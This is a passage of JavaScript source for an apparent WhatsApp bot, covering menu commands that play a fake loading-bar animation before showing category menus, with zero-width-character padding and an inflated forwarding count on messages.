​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
┌└─────────────┈ ⳹
│ 🖤allmenu
│ 🖤downloadmenu
│ 🖤groupmenu
│ 🖤ownermenu
│ 🖤photooxymenu
│ 🖤textpromenu
│ 🖤ephoto360menu
│ 🖤stickermenu
│ 🖤stalkermenu
│ 🖤othermenu
└─────────────────┈ ⳹`
let ments = [ownernya, me, mark]        
HBWABotInc.sendMessage(from, { 
text: herbertezy,
contextInfo:{
forwardingScore: 9999999,
inForworded: false, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./HBMedia/theme/hbwabot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
}
break
case 'allmenu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​${allmenu(prefix, hituet)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break
case 'downloadmenu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break
case 'groupmenu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break 
case 'stalkermenu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
 let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break
case 'textpromenu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break
case 'ephoto360menu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break
case 'stickermenu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break
case 'photooxymenu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break
case 'othermenu': { 
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe 
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hi @${sender.split("@")[0]}\n\n​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​